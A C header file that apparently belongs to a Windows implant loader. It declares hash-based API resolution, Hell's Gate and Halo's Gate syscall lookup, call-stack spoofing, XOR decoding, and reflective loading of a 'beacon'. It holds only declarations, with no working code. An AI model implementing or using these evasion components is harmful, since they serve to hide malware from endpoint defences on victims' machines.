//
// Created by Jm on 2024/6/21.
//

#ifndef STACK_CALL_PEB_API_H
#define STACK_CALL_PEB_API_H
BYTE * loaded_module_base_from_hash(DWORD hash);
void * resolve_api_address_from_hash(DWORD api_hash, Dll * module);
#define NtCurrentProcess() ( (PVOID)(LONG_PTR) -1 )
void setup_synthetic_callstack(Spoof_Struct * spoof_struct);
void getApis(APIS * api);
void getHeapApis(HEAP_APIS * api);
void * xGetProcAddress_hash(DWORD api_hash, Dll * module);
void * xLoadLibrary(void * library_name);
void parse_module_headers(Dll* module);
extern PVOID  NTAPI spoof_synthetic_callstack(PVOID  a, ...);
DWORD findSyscallNumber(PVOID ntdllApiAddr);
DWORD HellsGate(DWORD wSystemCall);
VOID  HellDescent(VOID);
DWORD halosGateDown(PVOID ntdllApiAddr, DWORD index);
DWORD halosGateUp(PVOID ntdllApiAddr, DWORD index);
DWORD getSyscallNumber(PVOID functionAddress);
PVOID   add(PVOID a, PVOID b);
void doSections(Dll * virtual_beacon, Dll * raw_beacon);
void doImportTable(APIS * api, Dll * virtual_beacon, Dll * raw_beacon);
void doRelocations(APIS * api, Dll * virtual_beacon, Dll * raw_beacon);
void* checkFakeEntryAddress_returnReal(Dll * raw_beacon, Dll * virtual_beacon);
VOID xorc(ULONG_PTR length, BYTE * buff, BYTE maskkey);



#endif //STACK_CALL_PEB_API_H
